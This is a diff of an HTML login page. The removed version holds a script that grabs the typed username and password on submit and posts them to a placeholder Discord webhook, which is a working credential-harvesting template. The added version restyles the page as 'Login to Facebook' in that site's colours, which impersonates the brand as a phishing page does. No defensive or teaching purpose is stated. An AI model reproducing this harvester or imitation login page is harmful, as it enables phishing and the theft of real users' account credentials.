@@ -3,104 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Login to Facebook</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: #fff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             text-align: center;
-            width: 360px;
+            margin-top: 50px;
         }
-        .login-container h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
+        .container {
+            width: 300px;
+            margin: 0 auto;
         }
-        .login-container input[type="text"],
-        .login-container input[type="password"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 15px;
+            padding: 10px;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
             box-sizing: border-box;
         }
-        .login-container button {
-            width: 100%;
-            padding: 15px;
+        button {
             background-color: #1877f2;
             color: white;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-        }
-        .login-container button:hover {
-            background-color: #165dc0;
-        }
-        .login-container .footer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #777;
-        }
-        .login-container .footer a {
-            color: #1877f2;
+            padding: 10px 20px;
+            text-align: center;
             text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #3b5998;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Login</h1>
-        <form id="loginForm">
-            <input type="text" id="username" name="username" placeholder="Username" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
+    <div class="container">
+        <h2>Login to Facebook</h2>
+        <form>
+            <input type="text" placeholder="Username or email">
+            <br>
+            <input type="password" placeholder="Password">
+            <br>
             <button type="submit">Login</button>
         </form>
-        <div class="footer">
-            <p>Forgot your password? <a href="#">Click here</a></p>
-        </div>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            const data = {
-                content: `Username: ${username}\nPassword: ${password}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        });
-    </script>
 </body>
 </html>
